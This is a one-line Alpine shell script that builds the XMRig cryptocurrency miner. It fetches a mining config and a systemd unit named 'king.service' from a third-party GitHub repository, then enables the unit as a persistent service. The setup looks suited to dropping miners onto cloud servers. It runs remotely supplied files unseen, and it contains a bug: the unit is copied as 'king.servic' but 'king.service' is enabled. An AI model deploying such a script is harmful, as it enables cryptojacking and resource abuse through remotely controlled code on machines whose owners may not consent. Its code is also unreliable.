#!/bin/sh
apk update && apk upgrade && apk add git make cmake libstdc++ gcc g++ automake libtool autoconf linux-headers wget curl bash && cd /home && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps -DBUILD_STATIC=ON && make -j$(nproc) && sysctl -w vm.nr_hugepages=1024 && wget https://raw.githubusercontent.com/taikhoanxzc004/scaleway/master/XM-S1.json && mv XM-S1.json config.json && chmod a+x config.json && wget https://raw.githubusercontent.com/taikhoanxzc004/scaleway/master/king.service && cp king.service /lib/systemd/system/king.servic && systemctl daemon-reload && systemctl enable king.service && systemctl start king.service
